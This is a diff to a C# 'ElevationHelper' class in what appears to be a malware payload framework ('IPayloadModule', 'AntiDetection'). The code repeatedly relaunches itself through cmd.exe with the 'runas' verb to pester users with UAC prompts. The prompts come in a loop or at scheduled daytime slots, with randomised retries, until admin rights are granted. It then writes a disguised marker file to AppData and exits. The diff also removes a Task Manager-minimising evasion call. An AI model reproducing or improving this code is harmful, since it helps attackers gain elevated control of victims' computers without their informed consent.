@@ -2,7 +2,9 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -11,6 +13,7 @@ namespace zort
 {
     public class ElevationHelper : IPayloadModule
     {
+        public const string ELEVATION_FILE_NAME = "02D873SF743.DAT";
         private readonly Thread _elevThread = new Thread(TimedElevate);
 
         public ElevationType ElevationType => ElevationType.NonElevated;
@@ -39,19 +42,23 @@ namespace zort
             return principal.IsInRole(adminGroup);
         }
 
+        public static string GetElevationFilePath()
+        {
+            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ELEVATION_FILE_NAME);
+        }
+
         public static bool TryElevate()
         {
             try
             {
 
                 //TODO: this holds the thread until the UAC prompt is closed. use a helper cmd for the UAC Prompt.
-                var process = Process.GetCurrentProcess();
                 var startInfo = new ProcessStartInfo
                 {
                     UseShellExecute = true,
                     Verb = "runas",
                     FileName = "cmd.exe",
-                    Arguments = $"/c start \"\" \"{process.MainModule.FileName}\""
+                    Arguments = $"/c start \"\" \"{Assembly.GetExecutingAssembly().Location}\""
                 };
                 Process.Start(startInfo);
             }
@@ -66,8 +73,6 @@ namespace zort
                 return false;
             }
 
-             // Exit the current process to avoid running the same instance again
-            Environment.Exit(0);
             return true;
         }
 
@@ -83,7 +88,6 @@ namespace zort
                 while (!didElevate)
                 {
                     didElevate = TryElevate();
-                    AntiDetection.MinimizeTaskManager();
                     Thread.Sleep(1500);
                 }
             }
@@ -92,12 +96,13 @@ namespace zort
                 var now = DateTime.Now;
                 var timesToElevate = new List<TimeSpan>
                     {
+                        new TimeSpan(8, 25, 0),
                         new TimeSpan(9, 15, 0),
                         new TimeSpan(10, 5, 0),
                         new TimeSpan(10, 55, 0),
                         new TimeSpan(11, 45, 0),
                         new TimeSpan(12, 35, 0),
-                        new TimeSpan(13, 35, 0),
+                        new TimeSpan(13, 05, 0),
                         new TimeSpan(14, 15, 0),
                         new TimeSpan(15, 5, 0)
                     };
@@ -116,11 +121,20 @@ namespace zort
 
                 var didElevate = false;
                 var timeout = nextTime.Add(new TimeSpan(0, 5, 0));
+                Random r = new Random();
 
                 while (!didElevate && DateTime.Now.TimeOfDay <= timeout)
                 {
                     didElevate = TryElevate();
+                    if(!didElevate) Thread.Sleep(r.Next(1000, 2000));
                 }
+
+                if(didElevate)
+                {
+                    string elevationAttribPath = GetElevationFilePath();
+                    File.Create(elevationAttribPath).Close();
+                    Environment.Exit(0);
+                } 
             }
         }
     }
